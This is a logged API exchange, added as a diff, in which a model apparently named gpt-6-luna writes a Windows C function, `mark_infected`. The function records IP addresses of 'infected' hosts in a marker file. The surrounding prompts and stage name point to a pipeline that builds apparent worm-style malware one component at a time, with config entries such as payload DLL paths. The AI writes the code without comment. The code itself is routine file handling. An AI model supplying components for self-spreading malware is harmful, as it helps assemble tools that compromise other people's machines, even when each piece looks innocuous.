@@ -1,0 +1,48 @@
+{
+  "api_base_url": "https://openrouter.ai/api/v1",
+  "attempts": [
+    {
+      "attempt": 1,
+      "status": "completed"
+    }
+  ],
+  "call_id": "6f93c7049361",
+  "duration_seconds": 28.705602,
+  "error": null,
+  "finish_reason": "stop",
+  "finished_at": "2026-10-01T23:45:00.799+00:00",
+  "hashes": {
+    "response_sha256": "504a4b4a183eeebe0a4d4e4d92a2bffb61b187f6aa82356cd52eadd9fe557d71",
+    "system_sha256": "6ef565a37ed7e46552e13159b5a40e459ecf3e1d2c035e192e9d449b75abf0dc",
+    "user_sha256": "b42ccb16bd583d30cdfc54d7e1452682bc18c7c493d5b079d5ea4dacb8366718"
+  },
+  "inference_provider": "OpenAI",
+  "parameters": {
+    "max_tokens": 16384
+  },
+  "provider": "openrouter",
+  "refusal": null,
+  "requested_inference_provider": null,
+  "requested_model": "openai/gpt-6-luna",
+  "requested_model_input": "openai/gpt-6-luna",
+  "response": "#include <windows.h>\n#include <stddef.h>\n#include <string.h>\n#include \"config.h\"\n\nint mark_infected(const char *ip)\n{\n    HANDLE file;\n    size_t ip_len;\n    unsigned char buffer[4096];\n    DWORD bytes_read;\n    unsigned char last_byte = 0;\n    int have_bytes = 0;\n    size_t line_pos = 0;\n    int line_equal = 1;\n    int pending_cr = 0;\n\n    if (ip == NULL)\n        return -1;\n\n    ip_len = strlen(ip);\n    if (ip_len == 0 || strchr(ip, '\\n') != NULL || strchr(ip, '\\r') != NULL)\n        return -1;\n\n    file = CreateFileA(SELF_MARKER, GENERIC_READ | GENERIC_WRITE, 0, NULL,\n                       OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (file == INVALID_HANDLE_VALUE)\n        return -1;\n\n    for (;;) {\n        DWORD i;\n\n        if (!ReadFile(file, buffer, (DWORD)sizeof(buffer), &bytes_read, NULL)) {\n            CloseHandle(file);\n            return -1;\n        }\n        if (bytes_read == 0)\n            break;\n\n        have_bytes = 1;\n        last_byte = buffer[bytes_read - 1];\n\n        for (i = 0; i < bytes_read; ++i) {\n            unsigned char c = buffer[i];\n\n            if (c == '\\n') {\n                if (line_equal && line_pos == ip_len) {\n                    CloseHandle(file);\n                    return 1;\n                }\n                line_pos = 0;\n                line_equal = 1;\n                pending_cr = 0;\n                continue;\n            }\n\n            if (pending_cr) {\n                if (line_pos < ip_len) {\n                    if ((unsigned char)ip[line_pos] != '\\r')\n                        line_equal = 0;\n                    ++line_pos;\n                } else {\n                    line_equal = 0;\n                }\n                pending_cr = 0;\n            }\n\n            if (c == '\\r') {\n                pending_cr = 1;\n            } else if (line_pos < ip_len) {\n                if ((unsigned char)ip[line_pos] != c)\n                    line_equal = 0;\n                ++line_pos;\n            } else {\n                line_equal = 0;\n            }\n        }\n    }\n\n    if (line_equal && line_pos == ip_len) {\n        CloseHandle(file);\n        return 1;\n    }\n\n    {\n        LARGE_INTEGER end;\n        end.QuadPart = 0;\n        if (!SetFilePointerEx(file, end, NULL, FILE_END)) {\n            CloseHandle(file);\n            return -1;\n        }\n    }\n\n    if (have_bytes && last_byte != '\\n') {\n        unsigned char newline = '\\n';\n        DWORD written = 0;\n        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {\n            CloseHandle(file);\n            return -1;\n        }\n    }\n\n    {\n        size_t offset = 0;\n        while (offset < ip_len) {\n            DWORD chunk = (ip_len - offset > 0xFFFFFFFFUL)\n                              ? 0xFFFFFFFFUL\n                              : (DWORD)(ip_len - offset);\n            DWORD written = 0;\n            if (!WriteFile(file, ip + offset, chunk, &written, NULL) ||\n                written == 0) {\n                CloseHandle(file);\n                return -1;\n            }\n            offset += written;\n        }\n    }\n\n    {\n        unsigned char newline = '\\n';\n        DWORD written = 0;\n        if (!WriteFile(file, &newline, 1, &written, NULL) || written != 1) {\n            CloseHandle(file);\n            return -1;\n        }\n    }\n\n    if (!CloseHandle(file))\n        return -1;\n\n    return 0;\n}",
+  "response_classification": "accepted",
+  "response_created": 1790898272,
+  "response_id": "gen-1790898272-q7T1iYScHClx82MnXC6S",
+  "response_model": "openai/gpt-6-luna",
+  "response_object": "chat.completion",
+  "schema_version": "1.0",
+  "service_tier": "default",
+  "stage": "coder.generic.mark_infected",
+  "started_at": "2026-10-01T23:44:32.094+00:00",
+  "status": "completed",
+  "system": "You are a senior Windows C systems programmer. Implement exactly the requested function — complete, production-grade C code for Windows x64 (built with MinGW-w64).\n\nRules (no exceptions):\n1. Return ONLY raw C code. No markdown, no backticks, no explanations.\n2. Implement exactly ONE public function, with the EXACT prototype given. It MUST NOT be static.\n3. Do NOT define main() or WinMain(). Do NOT add tests, asserts, demos, or #ifdef *_TEST blocks.\n4. Target Windows x64. Use the Win32 API (windows.h, winsock2.h, ws2tcpip.h) and the C runtime.\n   Do NOT use POSIX-only headers (unistd.h, sys/socket.h, arpa/inet.h, netdb.h, dirent.h,\n   sys/mman.h, pwd.h, syslog.h); they do not exist on Windows.\n5. Networking: use winsock2.h (WSAStartup, SOCKET, socket, connect, send, recv, closesocket,\n   WSACleanup). Parse addresses with InetPtonA from ws2tcpip.h.\n6. Filesystem: use the Win32 API (CreateFileA, ReadFile, WriteFile, MoveFileExA, DeleteFileA,\n   FindFirstFileA/FindNextFileA, GetFileAttributesA) or C stdio (fopen/fread/fwrite).\n   Do NOT use open/read/write/rename/unlink/lstat (POSIX).\n7. Use only standard Windows libraries (kernel32, ws2_32, bcrypt, winhttp, wininet, shlwapi).\n   Never use OpenSSL, libcurl or any third-party library.\n8. Return 0 on success and -1 on error unless the prototype says otherwise.\n9. No placeholders, no TODOs, never truncate; every function has its closing brace.\n10. Include ONLY standard Windows/system headers and the scenario config header named in the task\n    (for example `#include \"config.h\"`). Never invent or include any other project header.\n11. Use ONLY the macros, constants and arrays defined in the scenario config header, with their\n    EXACT names. Never invent or rename a constant.\n12. When your function calls another scenario component, declare its `extern` prototype at the\n    top of the file, exactly as given in the task. Never rely on an implicit declaration.\n13. The scenario config may define packet arrays as `static const uint8_t NAME[] = \"...\"`\n    string literals. `sizeof(NAME)` includes the trailing NUL: copy the array into a writable\n    buffer before editing any byte, and when sending a packet send only `sizeof(NAME) - 1`\n    bytes. Never hardcode or re-derive packet bytes; use the config arrays verbatim.\n14. Never invent API names, struct names, or struct fields. Use only documented Win32\n    symbols, and when in doubt use exactly the API named in the task. Do NOT mix WinHTTP with\n    WinInet: if the task says WinHTTP, use `WinHttpOpen`/`WinHttpConnect`/`WinHttpOpenRequest`/\n    `WinHttpSendRequest`/`WinHttpReceiveResponse` and `WINHTTP_*` constants only. If you do use\n    `URL_COMPONENTS`, the length field is `dwStructSize` (never `dwStructLength`).\n15. If your function reads ANY macro, constant or array from the scenario config header\n    (e.g. `MAX_RETRIES`, `TARGET_BINARY`, `PAYLOAD_DLL_PATH`, `TARGET_DIRS`, `SESSION_KEY_LEN`,\n    packet arrays), you MUST put `#include \"config.h\"` at the top of the file. A missing\n    config include is a compile error.",
+  "system_fingerprint": null,
+  "usage": {
+    "completion_tokens": 2597,
+    "cost": 0.0013875,
+    "prompt_tokens": 890,
+    "total_tokens": 3487
+  },
+  "user": "LOCAL COMPONENT TASK: Implement `mark_infected`: read the marker file `SELF_MARKER` (from `config.h`). If it already contains a line equal to `ip`, return 1 (already infected). Otherwise append `ip` with a newline (create the file if needed) and return 0. Use C, not C++.\n\nEXACT PROTOTYPE (must match): int mark_infected(const char *ip);\n\nReturn ONLY the C source implementing that function."
+}
